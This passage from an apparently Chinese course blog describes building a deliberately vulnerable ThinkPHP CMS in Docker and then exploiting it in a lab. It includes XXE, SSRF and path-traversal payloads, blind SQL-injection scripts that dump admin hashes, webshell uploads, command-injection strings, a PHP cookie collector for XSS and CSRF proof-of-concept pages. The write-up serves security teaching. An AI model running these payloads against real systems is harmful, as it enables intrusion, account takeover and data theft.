查看客户端上的 Wireshark 数据时，我们看到 ping 请求从 tun0 发送到内部网络 IP，并且此数据包从 VPN 客户端发送到 VPN tunnel 在服务器端，我们看到类似的流量——主机 U 和主机 V 之间的 ping 请求和回复通信，中间有 VPN 服务器。 telnet 测试 首先在在Host U上使用telnet控制Host V 在内网主机Host V 上telnet 客户端HostU wireshark抓取的telnet的通信数据包 VPN server上的数据包信息 命令集合VPN server//编译程序 gcc -o vpnserver_tls vpnserver_tls.c -lssl -lcrypto -lcrypt //启动程序 sudo ./vpnserver_tls 4433 //设置tun0信息 添加转发功能 添加路由 sudo ifconfig tun0 192.168.53.1/24 up sudo sysctl net.ipv4.ip_forward=1 sudo route add -net 192.168.53.0/24 tun0 sudo route add -net 192.168.60.0/24 tun0 VPN client//编译程序 gcc -o vpnclient_tls vpnclient_tls.c -lssl -lcrypto //启动程序 sudo ./vpnclient_tls sunzy.com 4433 //设置tun0信息 添加路由 sudo ifconfig tun0 192.168.53.5/24 up sudo route add -net 192.168.60.0/24 内网主机route add -net 192.168.53.0/24 gw 192.168.60.1 enp0s3","tags":[{"name":"socket","slug":"socket","permalink":"https://sunzhengyu99.github.io/tags/socket/"}]},{"title":"mycms","date":"2021-03-21T07:47:46.000Z","path":"2021/03/21/mycms/","text":"网络安全与攻击实验课程作业 [TOC] 课程要求基于 Linux 操作系统（如 Ubuntu），使用 Docker 容器，选择一门自己擅长的语言（只能从 PHP、JAVA、Python 中选择）及其当前流行的开发框架（如 Java 的 Struts2、Spring、Hibernate，Python的 Django、flask，PHP 的 ThinkPHP 等） 开发一个 Web 应用系统。 具体要求： 1）该系统需内置典型的 Web 漏洞（不少于 10 种，每种可有多个）。必须包含 SQL 注入、XSS、文件上传、文件包含、命令执行、XXE和反序列化。 2）基于 Docker 容器发布系统，并完成内置典型漏洞的攻击过程。 3）将原有漏洞页面进行完善（不能直接在原有漏洞页面修改，需重新创建修复漏洞的页面）以修复所有漏洞，并通过测试证明漏 洞已经修复。 网站开发1.开发工具phpstorm+vscode phpstorm 重要用于对php代码的代码编写和修改，其提供了十分丰富的功能，帮助开发者快速修改代码，提供代码定位，能够快速的定位到某个函数所属文件，大大提高了工作效率。 而vscode则负责查看文件内容，其相对于PHP storm比较轻量，占用内存小，速度快。 2.环境搭建Linux使用docker以及docker-compose 具体为mysql 5.6 + nginx +php7.1 其中docker-compose.yml version: &#x27;3&#x27; services: nginx: image: hub.c.163.com/library/nginx:latest # 下载镜像的源，这里选择网易的镜像源，可以提高下载的速度， latest是最新版本 ports: - 80:80 # 端口映射 - 443:443 volumes: - ./nginx/nginx.conf:/etc/nginx/nginx.conf #nginx的配置文件路径 - ./nginx/conf.d:/etc/nginx/conf.d # 其他的配置文件 - ./html:/var/www #目录映射 src作为网站的根目录，网站的所有文件需要放在这里 php: build: ./php volumes: - ./html:/var/www #根目录 - ./php/php.ini:/usr/local/etc/php/php.ini # php的配置文件 - ./php/php-fpm.conf:/usr/local/etc/php-fpm.d/www.conf mysql: image: hub.c.163.com/library/mysql:5.6 volumes: - ./mysql/data:/var/lib/mysql - ./mysql/my.cnf:/etc/mysql/conf.d/my.cnf - ./mysql/init:/docker-entrypoint-initdb.d/ # 这里需要初始化一个数据库 ports: - 3306:3306 environment: - MYSQL_ROOT_PASSWORD=root # mysql数据库的密码 其余配置文件可以根据需要从网上获取。 windows搭建目的是测试使用，方便重新搭建和数据管理，为再linux上搭建做好准备 课程要求使用docker搭建运行环境，但是Linux系统是虚拟机搭建的，里面没有好用的phpStrom，所以先在windows上搭建，试试水。 工具使用phpstduy2018，apache+php7.1 首先在数据库中建立一个数据库，复制cms.sql中的内容在命令行中运行 将文件放入www目录下，修改config中的database.php内容，将用户名和密码该对应的内容 打开phpstduy,选择 其他菜单选项-&gt;站点域名管理，网站目录选择cms/public，网站名随便起，如www.mycms.com 打开host文件，添加 127.0.0.1 www.mycms.com，然后访问即可www.mycms.com/admin进入后台 账号密码都为admin 3.开发过程开发thinkphp的网站，当然离不开ThinkPHP的手册http://www.shouce.ren/api/view/a/15517 thinkphp中是基于模块\\控制器\\方法来访问网页的，所以我们必须学会如何创建一个控制器 在网站的文件下，调出终端使用 php think make:controller 模块名\\控制器名 创建完后便可以在浏览器中输入127.0.0.1\\模块名\\控制器名，进行访问，当然还要继续完善其中的内容 以上是开发最基础的部分，也是最重要的部分，所有的漏洞代码基本都需要在自己所创建的控制器中完成的。 4.网站介绍此站点采用的是基于thinkPHP的cms，此cms包含常用于一些公司主页介绍或者个人博客的搭建，是一个功能相对比较齐全的cms，但是随着功能的增多也会暴露出一些问题，所以会存在一些漏洞，加上自己根据课程要求对其进行了魔改，使得该系统包含了十二种漏洞，二十个漏洞点。 该网站是一家安全公司的主页，但是由于该安全公司刚刚成立不久，网站开发人员安全意识不够高（haha, 纯属虚构），导致该网站中存在了很多漏洞，此时一个不安好心的黑客看上了这家安全公司的网站。对该网站进行了攻击。 具体功能如下： (1).前台展示页面，包含关于我们，新闻中心，联系我们以及意见反馈四个模块 其中关于我们–&gt;公司主页 位置存在SSRF漏洞 意见反馈 存在XXE漏洞 (2).后台管理员页面，后台管理功能十分丰富，几乎包含所有需要的功能，并且可以根据需要自定义模块并安装，其中的短消息发送存在XSS漏洞，查看内网主机和phpinfo存在远程命令执行漏洞，管理会员的页面存在CSRF漏洞 (3).用户注册与登录，提供用户注册和登录功能，登录后的用户可以根据权限向不同的栏目投稿，向别的用户发送消息，支持头像更换，密码修改等功能。其中投稿位置存在XSS漏洞和文件上传漏洞，密码修改位置存在SQL注入漏洞。 (4).在前台页面中有一个单独的模块，叫免试加入，这里存在一个CTF题目，类型时unserialize，如果可以获取flag，则可以获取免试资格加入团队。 5.漏洞介绍 本地文件包含 本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞，造成这个漏洞的函数有四个include,include_once,require,require_once。该漏洞可以使用php为协议php://filter，读取php文件的源码，在一些ctf题目中很常见。 该漏洞存在于网站首页的联系我们页面 ssrf 服务器端请求伪造是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统，攻击者可以利用该漏洞对内网进行扫描探测存活的主机和端口，进而对内网进行攻击。此外该漏洞还会造成文件包含，使用file://协议+文件绝对路径可以获取服务器上的文件。 总结SSRF造成的危害： 扫内网 向内部任意主机的任意端口发送精心构造的Payload DOS攻击（请求大文件，始终保持连接Keep-Alive Always） 攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sqli等） 利用file协议读取本地文件等 此漏洞存在访问公司主页 xxe XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是XML外部实体。 此漏洞可以形成命令执行和文件包含攻击。 此漏洞存在于意见反馈页面 sql注入 — 包含两个漏洞点 Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。 此漏洞存在与用户修改密码页面和登录修改稿件页面，二者都可以使用盲注进行攻击。 文件上传 网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。 此漏洞存在于用户上传头像的位置，上传一句话木马后可直接使用蚁剑获取shell 弱口令 弱口令顾名思义是使用了安全性比较低，并且比较常见的短字符作为密码 此漏洞存在于管理员密码，这是很常见但又很危险的一个漏洞 xss — 包含两个漏洞点 xss就是攻击者在web页面插入恶意的Script代码，当用户浏览该页之时，嵌入其中web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。攻击这可以使用xss获取处于登录状态的用户cookie，从而可以无密码登录账号。 此漏洞存在两个地方，一个是用户投稿，一个用户发送短消息 rce 是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。 此漏洞存在于后台管理页面中的信息采集–&gt;查看内网主机 任意文件下载 非法下载服务器上存在的资源 csrf 跨站点请求伪造 ， 跟XSS攻击一样，存在巨大的危害性 。利用csrf，攻击者可以盗用你的身份，以你的名义发送恶意请求。 你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 反序列化 不安全的反序列化是指网站对用户可控制的数据进行反序列化时，攻击者能够操纵序列化的对象，以将有害数据传递到应用程序代码中。甚至有可能用完全不同类的对象替换序列化的对象。更夸张的是，将对网站可用的任何类别的对象进行反序列化和实例化，而与预期的类别无关。因此，不安全的反序列化有时称为“对象注入”漏洞 此漏洞存在免试加入我们的页面，成功者可以获得一个flag。 漏洞利用渗透测试流程 1.RFI首先点击首页的最下面“优秀员工”，可以发现URL的变化，看到最后有一个file参数，猜测该页面的一些参数是从info.php中获取的，那么这个位置就应该是一个本地文件包含。尝试将info.php换成其他的文件名，发现页面中的一些内容消失了，说明这里就是用了文件包含。 那么如果没有对该参数进行过滤或者其他的限制的话，我们就可以使用php://filter协议读取到php文件的base64源码， 或者直接读取操作系统中的一些敏感文件，如/etc/passwd。 可以看到，这里没有对file协议过滤，这样就可以通过一些常用的文件路径获取到敏感文件 2.XXE注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。 xxe漏洞存在于意见反馈页面，使用Bp抓包可以看到，提交的参数是xml格式，提交成功后会返回一个提示信息 既然参数是以xml格式提交的，那么我们可以尝试构造出一个外部实体注入其中，造成文件包含或者命令执行。 使用payload读取/etc/passwd文件 &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;file;&lt;&#x2F;username&gt;&lt;info&gt;as&lt;&#x2F;info&gt;&lt;&#x2F;user&gt; 3.SSRF当访问公司主页这个页面时会发现url发生变化，并跳转到另一页面 这里是跳转到了我的博客页面，但是可能由于缺少渲染，显示不正常，尝试访问百度，get提交 ?url=https://www.baidu.com 可以发现成功跳转到了百度的页面，猜测我们提交的url参数没有进行过滤就直接带入到函数中执行。 那么我们可以尝试使用file://协议读取服务器上的文件，使用payload:?url=file:///etc/passwd，成功读取到文件内容，漏洞利用成功。 4.目录遍历在浏览器中按F12，在network中查看响应头，可以发现存在server字段，这是网站使用的服务器以及版本信息，这里可以看到是nginx 而nginx存在一个很常见的漏洞—配置不当导致的目录穿越漏洞 进行攻击 尝试访问http://192.168.164.147/files/，出现了images文件夹，这应该网站保存上传图片的位置 输入http://192.168.164.147/files../看到了网站的根目录中的内容，点击可以将部分文件下载。 5.SQL注入（4个）漏洞点一第一个sql注入漏洞点在用户登录页面，存在一个修改密码功能，先注册有一个用户，尝试修改密码，猜测其工作机制。 第一次尝试输入一个不存在的用户名，返回信息是no user! 第二次输入正确的用户名错误的密码，提示wrong password!，这个逻辑很正常 第三次输入正确的用户名和密码，而两个不一样的新密码，提示new password are different! 这上面的三种情况是修改密码时常见的情况，看似都可以正常的工作，但是如果没有对用户名这个参数进行严格的过滤的话就可以造成盲注的漏洞。 因为当我们提交完参数后，服务器要做的第一件事就是去数据库种查找是否存在该用户名，若不存在则返回no user!，若存在的话且输入的两次新密码都正确但是旧密码错误，就会提示用户wrong password!，这也是造成盲注的重要原因。比如说，我们注册的用户名和密码分别为szy和admin，但是我们提交时构造出如下的语句 account=szy&#x27; and 1=1#&amp;password=ad&amp;npassword=111&amp;newpassword=111 account=szy&#x27; and 1=2#&amp;password=ad&amp;npassword=111&amp;newpassword=111 看到以上的结果我们就可以判断一定存在注入。 构造payload account=szy&#x27; and ascii(substring(database(),1,1))&gt;100 #&amp;password=ad&amp;npassword=111&amp;newpassword=111 返回的是wrong password，说明数据库名的第一个字符的ascii码是大于100的，直接使用二分注入，脚本如下 import requests import time url = &quot;http://192.168.164.147:81/change/changepass&quot; heard = &#123;&quot;Cookie&quot;:&quot;http://192.168.164.147:81/change/changepass&quot;&#125; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # time.sleep(1) payload = &quot;szy&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125; #&quot;.format(i,mid) payload = &quot;szy&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)#&quot;.format(i,mid) payload = &quot;szy&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;yzn_admin&#x27; having a&gt;&#123;1&#125;)#&quot;.format(i,mid) payload = &quot;szy&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from yzn_admin having a&gt;&#123;1&#125;)#&quot;.format(i,mid) data = &#123;&quot;account&quot;:payload, &quot;password&quot;:&quot;111a&quot;,&quot;npassword&quot;:&quot;222&quot;,&quot;newpassword&quot;:&quot;222&quot;&#125; response = requests.post(url=url,data=data,headers=heard) # t = response.text if &quot;wrong password&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) print(flag) ​``` database:yzncms table:yzn_admin columns:id,username,password,roleid,encrypt ​``` yzn_admin的列名，省略了后面的列 获取管理员的用户名和密码 username:admin password:9724b5e6c56b95f5723009ef81961bfe 这个密码是32位的，可能是md5处理后保存的，暂时无法破解。 漏洞点二用户登录后，存在一个查找用户邮箱的功能，这里可能存在注入。 这里已经提示了存在了过滤，那么就看看过滤那些东西 输入一个存在的用户名，查找结果如图 输入一个不存在的用户 尝试输入 sunzy&#x27; or 1=1 # 网页报错，并将错误信息显示，可以看到输入的or,空格都被换成了空格，这还是很容易绕过的 fuzz测试后，发现过滤union,空格,or,and,select,from，可以使用双写绕过，空格的可以使用/**/替换 经过测试，发现返回结果只有一列 直接进行sql注入 获取数据库中的表名 sunda&#x27;/**/ununionion/**/selselectect/**/group_concat(table_name)/**/frfromom/**/infoorrmation_schema.tables/**/where/**/table_schema=database()# 获取字段名 sunda&#x27;/**/ununionion/**/selselectect/**/group_concat(column_name)/**/frfromom/**/infoorrmation_schema.columns/**/where/**/table_name=&quot;yzn_member&quot;# 获取字段值 sunda&#x27;/**/ununionion/**/selselectect/**/group_concat(passwoorrd)/**/frfromom/**/yzn_member# 漏洞点三用户主页-&gt;积分赠送，通过测试可以发现也是存在sql注入的 因为没有回显，需要使用盲注 盲注脚本与上面的类似，稍加修改即可。 漏洞点四注册后登录，发现其中存在一个投稿的功能，投稿后需要管理员审核，在此期间我们可以再次编辑我们的稿件 当点击编辑后，发现url上多了一个id参数，这应该是我们稿件的id，方便查询。但是通常这种参数如果过滤不严格的话也会存在SQL注入，而这个位置显然输入数字型注入。 http://192.168.164.147:81/member/content/edit.html?id=3 探测是否 存在注入，当输入?id=3 and 1=1 #时页面返回正常，但是当输入?id=3 and 1=2#,却提示了稿件不存在，说明这里也是存在注入的，但是没有回显，无法获取返回的内容只能采用盲注的方法。 ==在测试的过程种发现这个位置使用 &gt;时会出现错误提示，而&lt;不起作用，只能使用=，所以无法使用二分注入，但是直接暴力破解也很快== # -*- coding = utf - 8 -*- #@Time : 2021/3/20 9:03 #@Author : sunzy #@File : cms_sql2.py import requests import time url = &quot;http://192.168.164.147:81/member/content/edit.html?id=&quot; header = &#123;&quot;Cookie&quot;: &quot;thinkphp_show_page_trace=0|0; PHPSESSID=d2b4f4b001d70e670953a36d00ca8be6; thinkphp_show_page_trace=0|0&quot;&#125; flag = &quot;&quot; words = [&quot;,&quot;,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;_&quot;,&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;,&quot;F&quot;,&quot;G&quot;,&quot;H&quot;,&quot;I&quot;,&quot;J&quot;,&quot;K&quot;,&quot;L&quot;,&quot;M&quot;,&quot;N&quot;,&quot;O&quot;,&quot;P&quot;,&quot;Q&quot;,&quot;R&quot;,&quot;S&quot;,&quot;T&quot;,&quot;U&quot;,&quot;V&quot;,&quot;W&quot;,&quot;X&quot;,&quot;Y&quot;,&quot;Z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;] def dump(): flag = &#x27;&#x27; for i in range(1,50): for word in words: # payload = &quot;3 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a = &#123;1&#125;)#&quot;.format(i,ord(word)) payload = &quot;3 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;yzn_admin&#x27; having a=&#123;1&#125;)#&quot;.format(i,ord(word)) payload = &quot;3 and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from yzn_admin having a=&#123;1&#125;)#&quot;.format(i,ord(word)) url1 = url+payload res = requests.get(url1,headers=header) if &quot;立即提交&quot; in res.text: flag += word break print(flag) if __name__ == &#x27;__main__&#x27;: dump() 成功获取到数据库名，漏洞利用成功。 6.暴力破解该漏洞是由于管理员或者用户使用了常用的简单密码，攻击者可以通过暴力破解的方式获取用户名和密码，前面的sql注入我们可以知道管理员账号为admin,但是密码为加盐后的md5值，我们无法破解，只能尝试使用暴力破解。 在文件上传漏洞点一中我们发现了admin模块就在路径为\\application\\admin，所以管理员后台url应该为http://192.168.164.147/admin 当然这里也可以根据经验猜测后台登录路径。 访问后台 查看源码可以发现，登录是需要token的，但是还是可以使用bp自带的模块破解，不过需要麻烦一点。 使用bp抓包，将数据包发送到Intruder模块，然后加上参数，选择Pitchfork模式 到option页面，不可以多线程 设置payload1,也就是token值 设置payload2 password的值，这里可以选择自己收藏的密码字典，或者直接使用bp自带的。 爆破结果 当密码为admin时，可以看到相应包中返回的数据存在一个url，很明显这里是，登录成功后进行的跳转，可以在浏览器中看到，已经登录到了后台页面 结合前面sql注入获取的密码和encrypt，尝试猜测密码的保存方式 md5(&#x27;adminWo0bAa&#x27;) = 9724b5e6c56b95f5723009ef81961bfe 所以密码保存的是密码和加密因子拼接后的md5值。 7.文件上传（3个）漏洞点一用户登录后可以看到一个图片征集页面http://192.168.164.147/member/index/photo 随便上传一个图片文件后，可以看到返回了图片的保存地址 但是当上传一个非图片类型时，会提示只允许上传.jpg|.png|.gif 这只是前端检测，抓包就可以解决 抓包上传一个php为后缀的文件，并将MIME改为image/jpeg,可以看到php后缀被换成空了 尝试双写绕过，可以看到文件已经正常上传 访问可以看到phpinfo 下面就是上传一句话木马，控制服务器 漏洞点二用户登录后可以在内容管理—&gt;在线投稿的位置投稿，这里用户可以上传稿件中需要用到图片 但是攻击者可能会上传一些刻意文件，比如一句话木马，来攻击服务器，下面我们上传一个php文件获取phpinfo 首先选择一张空的照片，然后将其改为php文件，内容为&lt;? phpinfo(); ?&gt;，可以看到上传成功的url 访问服务器返回的url，已经看到该网站的phpinfo信息，也就是确定了该上传目录拥有可执行权限，下一步就是上传一句话木马进一步控制该服务器。 上传一句话木马 使用蚁剑连接即可。 漏洞点三在上一步中我们已经知道了admin的账号密码，然后登录。再用自己注册的账号向某个栏目投稿，之后管理员再审核，便会出现一个类似于用户投稿的页面，然后就可以像上一个漏洞一样上传一句话木马文件。 8.XSS（2个）漏洞点一登录管理员账号后可以发送短消息给用户 在之前的sql注入漏洞里，我们可以获取yzn_member表中的所有信息，虽然可以获取密码，但是因为是md5值，并且是加盐后的md5值，破解的难度很高，所以可以使用获取cookie的方式攻击。 从中可以看到用户登录的时间，从而可以判断该用户是否在线，我们选择那些在线的用户，获取其浏览器的cookie，这样就可以做到密码登录其账号。 尝试向用户szy发送带有恶意脚本的短消息，内容如下 发送完后，浏览器弹出xss，并且每次刷新都会出现弹窗，说明是存储型XSS。 当用户点开收件箱时，浏览器也会出现弹窗，说明漏洞利用成 ==尝试获取用户cookie(失败)== 首先在服务器上写一个获取cookie的脚本，内容如下，就是获取cookie参数，然后将其写入cookie.txt中，并记录写入的时间。 &lt;?php $cookie = $_GET[&#x27;cookie&#x27;]; $ip = getenv (&#x27;REMOTE_ADDR&#x27;); $time = date(&#x27;Y-m-d g:i:s&#x27;); $fp = fopen(&quot;cookie.txt&quot;,&quot;a&quot;); fwrite($fp,&quot;IP: &quot;.$ip.&quot;Date: &quot;.$time.&quot; Cookie:&quot;.$cookie.&quot;\\n&quot;); fclose($fp); ?&gt; 然后向用户发送带有恶意脚本的消息，192.168.164.1为服务器的ip地址，这里就使用了自己的本机地址，而在现实的渗透测试中是需要选择能够与公网通信的服务器或者vps。 当用户点开收件箱后，这个脚本就会自动执行，就可以将cookie写入到服务器上的cookie.txt。 查看cookie.txt 获取的cookie 但是可以发现这里的cookie好像并不完整，看了一下原来是PHPsession值那里设置了http-only，而http-only就是防止通过js脚本读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容。 漏洞点二登录后的用户可以在留言板进行留言，留言后会显示近期的留言信息 url http://192.168.164.147/member/index/comment.html 在留言中插入恶意脚本，此时数据会被提交到服务器处理，并写入数据库，显示近期的留言，此时恶意脚本被执行，造成了XSS漏洞 可以看大恶意脚本被浏览器执行，嵌入到html页面中 9.RCE（2个）漏洞点一后台管理中存在一个采集模块，其中存在于一个“phpinfo”，点击即可查看到phpinfo信息 这里看似没有提交参数位置，让人觉得无从下手，在前端查看源码即可发现，是将输入框隐藏了，才无法看见，输入的内容。 抓包就可以发现端倪，可以看到这里存在一个post方式提交了一个data参数 提交的内容为 data=phpinfo() 然后就返回了php的各项信息，应该是执行了phpinfo这个函数，那么可能就是用到了eval()函数，尝试输入 data=system(&#x27;ls /&#x27;) 利用成功。 漏洞点二后台管理中存在一个采集模块，其中存在于一个“查看内网主机”，可以查看内网中的主机是否在线。查看一个主机是否在线最常用的方法就是使用ping命令，还要结合php中的shell_exec()函数。 尝试使用管道符拼接命令，造成命令执行。 payload: 127.0.0.1 | ls / 可以看到列出了根目录的文件夹，说明命令执行成功。 10.CSRF（4个）漏洞点一用户主页面–&gt;积分赠送 输入用户名和要赠送积分的数量即可赠送自己的积分 当我们通过查找用户邮箱功能获取到某个用户的邮箱时，就可以构造出一个类似于下图的网页，生成链接后通过邮箱发给受害者然后诱使其点击链接，就能神不知鬼不觉的将其积分转到自己的账号下 漏洞点二后台管理中，存在会员管理模块–&gt;点击编辑，在这里管理员可以改变会员的等级，积分和密码等。然而如果攻击者获取了更改用户等级的表单就可以精心构造出一个网页（burp可以一键生成），这个网页的功能可以将会员修改为攻击者想要的等级，或者是添加管理员。此时如果管理员不小心点击了这个链接，浏览器带着管理员登录时的cookie访问了该链接，那么服务器就认为修改会员等级的操作是管理员本人，执行该操作，从而造成攻击。 使用bp抓取该表单 username=szy&amp;nickname=szy&amp;mobile=17856276754&amp;email=263233%40qq.com&amp;password=&amp;groupid=2&amp;point=0&amp;vip=0&amp;overduedate=1970-01-01+08%3A00%3A00&amp;id=1 提交的数据中可以修改groupid, point, vip 使用bp一键生成攻击网页 生成的内容为 &lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;form action=&quot;http://192.168.164.147/member/member/edit.html?id=1&amp;dialog=1&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;szy&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;nickname&quot; value=&quot;szy&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;mobile&quot; value=&quot;17856276754&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;263233&amp;#64;qq&amp;#46;com&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;groupid&quot; value=&quot;5&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;point&quot; value=&quot;1000&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;vip&quot; value=&quot;1&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;overduedate&quot; value=&quot;1970&amp;#45;01&amp;#45;01&amp;#32;08&amp;#58;00&amp;#58;00&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 复制上面的链接，使用社工的方法发送给admin，如果他在处于登录状态时点击那么攻击就成功了。 点击Submit request，就会出现更新成功的提示。查看szy，确认其等级变化 可以看到该用户的等级已经变成了高级会员，并且积分点数也变成了1000，漏洞利用成功。 漏洞点三同样是在这个页面，有一个”添加”页面，同样也是存在CSRF漏洞，如果被攻击者利用，则可以创造出大量的无用账号，从而浪费服务器的资源，可能造成dos攻击。 漏洞点四内容-&gt;稿件管理-&gt;通过审核，这里会显示所有用户提交的稿件，但是如果攻击者提交了一个含有恶意代码的稿件，又想在admin不知情的情况下让这个稿件通过审核，此时就可以创建一个恶意链接发送给admin， 内容如下 &lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;form action=&quot;http://192.168.164.147/cms/publish/pass.html&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;ids&amp;#91;&amp;#93;&quot; value=&quot;4&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 当admin点击后，就会让稿件通过审核 11.任意文件下载首页中存在一个图片下载模块，可以下载自己喜欢的球星壁纸 但是我们可以拦截请求，修改提交的数据 尝试下载/etc/passwd文件，输入 filename=/etc/passwd 但是出现提示文件不存在！ 尝试多输入几个../ filename=../../../../../etc/passwd 成功获取到/etc/passwd文件内容 那么就可以结合RCE漏洞，获取到该服务器上的任意文件 首先利用RCE漏洞获取到文件的完整路径，之后配合该漏洞即可实现任意文件下载。 12.unserialize该漏洞就是一个CTF题目，但是源码需要利用前面的漏洞获取 链接:http://192.168.164.147/ctf/index 根据提示是一个ctf题目，那么应该也符合一般ctf中web题目的套路。 首先查看源码 ，获取提示 但是一般的反序列化漏洞的题目都是有源码的，只有根据源码才能写出EXP。 既然没有源码，我们就需要使用之前发现的漏洞获取源码。 有五种获取源码的方法 文件上传 上传一句话木马后，可以控制服务器，可以直接到网站根目录中下载文件 LFI 使用php://filter，在文件包含漏洞的位置获取base64源码 payload： http://192.168.164.147:81/contact/index?file=php://filter/convert.base64-encode/resource=unserialize.php XXE 利用文件上传获取的路劲 payload &lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;file:///var/www/public/unserialize.php&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;f;&lt;/username&gt;&lt;info&gt;das&lt;/info&gt;&lt;/user&gt; 任意文件下载 点击即可下载到文件 RCE 首先 列出目录 127.0.0.0 | ls 读取文件 127.0.0.0 | cat unserialize.php 源码如下 &lt;?php error_reporting(0); class a &#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;easy&#x27;) &#123; echo &quot;&lt;script&gt;alert(&#x27;flag&#123;xxxxxx&#125;&#x27;)&lt;/script&gt;&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;继续加油&#x27;)&lt;/script&gt;&quot;; &#125; &#125; &#125; function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string); &#125; $uname=$_POST[&#x27;payload&#x27;]; $password=1; $ser=filter(serialize(new a($uname,$password))); $test=unserialize($ser); ?&gt; 开始解题 考察点是反序列化字符逃逸 先从简单的PHP反序列化字符逃逸了解什么是反序化逃逸。 &lt;?php function filter($str)&#123; return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str); &#125; class A&#123; public $name=&#x27;aaaa&#x27;; public $pass=&#x27;123456&#x27;; &#125; $AA=new A(); $res=filter(serialize($AA)); $c=unserialize($res); echo $c-&gt;pass; ?&gt; 利用反序列化逃逸修改pass的值。 正常的序列化结果 O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125; s:4:&quot;aaaa&quot;s后面的数字表示变量的长度，php执行的时候会根据其长度读取数据，如果不符合规则则会反序列化失败。 例如 